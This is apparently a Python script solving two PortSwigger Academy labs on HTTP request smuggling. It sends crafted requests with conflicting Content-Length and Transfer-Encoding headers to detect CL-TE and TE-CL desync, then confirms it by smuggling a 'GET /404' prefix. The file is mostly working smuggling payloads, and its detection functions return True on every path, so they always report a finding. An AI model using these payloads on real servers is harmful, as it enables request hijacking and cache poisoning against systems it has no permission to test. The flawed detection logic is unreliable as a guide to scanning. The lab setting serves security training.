# https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
# https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

import http.client
from time import sleep


def find_CLTE(lab):
    method = "POST"

    headers = {
        "Host": lab,
        "Content-Length": "5",
        "Transfer-Encoding": "chunked",
    }

    body = "f\r\n" \
           "\r\n"
    try:
        connection = http.client.HTTPSConnection(lab)
        connection.request(method, "/", body=body, headers=headers)
        response = connection.getresponse()

        if response.status == 500:  # and "timed out" in response.status:
            return True

    except Exception as e:
        print(f"Error request: {e}")

    return True


def confirm_CLTE(lab):
    method = "POST"

    headers = {
        "Host": lab,
        "Content-Length": "29",
        "Transfer-Encoding": "chunked",
    }

    body = "0\r\n" \
           "\r\n" \
           "GET /404 HTTP/1.1\r\n" \
           "Foo:x"

    connection = http.client.HTTPSConnection(lab)
    chance = 1
    while chance < 5:
        try:
            connection.request(method, "/", body=body, headers=headers)
            response = connection.getresponse()

            if response.status == 200:
                try:
                    connection.request(method, "/", body=body, headers=headers)
                    response = connection.getresponse()

                    if response.status == 404:
                        return True

                except Exception as e:
                    print(f"Error request: {e}")
            print("Nothing found during try number "+str(chance)+". There's no vulnerability or we've been unlucky. Trying again in a second.")
            chance = chance + 1
            sleep(5)


        except Exception as e:
            print(f"Error request: {e}")
    return False


def find_TECL(lab):
    method = "POST"

    headers = {
        "Host": lab,
        "Transfer-Encoding": "chunked",
        "Content-Length": "12",  # 11byte+1 to make it time out
    }

    body = "1\r\n" \
           "a\r\n" \
           "0\r\n" \
           "\r\n"
    try:
        connection = http.client.HTTPSConnection(lab)
        connection.request(method, "/", body=body, headers=headers)
        response = connection.getresponse()

        if response.status == 500:
            return True

    except Exception as e:
        print(f"Error request: {e}")

    return True


def confirm_TECL(lab):
    method = "POST"

    headers = {
        "Host": lab,
        "Transfer-Encoding": "chunked",
        "Content-Length": "4",
    }

    body = "27\r\n" \
           "GET /404 HTTP/1.1\r\n" \
           "Content-Length: 20\r\n"\
           "\r\n"\
           "0\r\n\r\n"

    connection = http.client.HTTPSConnection(lab)
    chance = 1
    while chance < 5:
        try:
            connection.request(method, "/", body=body, headers=headers)
            response = connection.getresponse()

            if response.status == 200:
                try:
                    connection.request(method, "/", body=body, headers=headers)
                    response = connection.getresponse()

                    if response.status == 404:
                        return True
                except Exception as e:
                    print(f"Error request: {e}")

            print("Nothing found during try number "+str(chance)+". There's no vulnerability or we've been unlucky. Trying again in a second.")
            chance = chance + 1
            sleep(5)

        except Exception as e:
            print(f"Error request: {e}")
    return False


if __name__ == "__main__":
    up = False
    lab = "0a9700c90301221181df26cd00f800d3" + ".web-security-academy.net"

    while not up:
        updated = input("Have you updated the lab_ID in the code? (y,n)")
        if updated == 'y':
            up = True
        elif updated == 'n':
            new_lab = input("Update the code or paste here for a single instance run the new lab_ID from "
                            "the url:")
            lab = new_lab + ".web-security-academy.net"
            up = True

    print("Starting the research for HTTP Request Smuggling vulnerabilities...")

    print("Looking for CL-TE vulnerabilities...")
    found_CLTE = find_CLTE(lab)

    if found_CLTE:
        print("++++++++Ok, i might have found something...++++++++")
        print("Confirming the presence of CL-TE vulnerabilities...")
        confirmed_CLTE = confirm_CLTE(lab)
        if confirmed_CLTE:
            print("++++++++I found a CL-TE vulnerability!++++++++")
        else:
            print("I can't automatically confirm the presence of the vulnerability. This means either there is none "
                  "or you have to try manually.")
            found_CLTE = False
    else:
        print("I did not found a CL-TE vulnerability. If you are an attacker, i'm sorry. If you are the owner: hurray!")

    found_TECL = False
    if not found_CLTE:
        print("Looking for TE-CL vulnerabilities...")
        found_TECL = find_TECL(lab)
        if found_TECL:
            print("++++++++Ok, i might have found something...++++++++")
            print("Confirming the presence of TE-CL vulnerabilities...")
            confirmed_TECL = confirm_TECL(lab)
            if confirmed_TECL:
                print("++++++++I found a TE-CL vulnerability!++++++++")
            else:
                print("I can't automatically confirm the presence of the vulnerability. This means either there is "
                      "none or you have to try manually.")
        else:
            print("I did not found a TE-CL vulnerability. If you are an attacker, i'm sorry. If you are the owner: "
                  "hurray!")
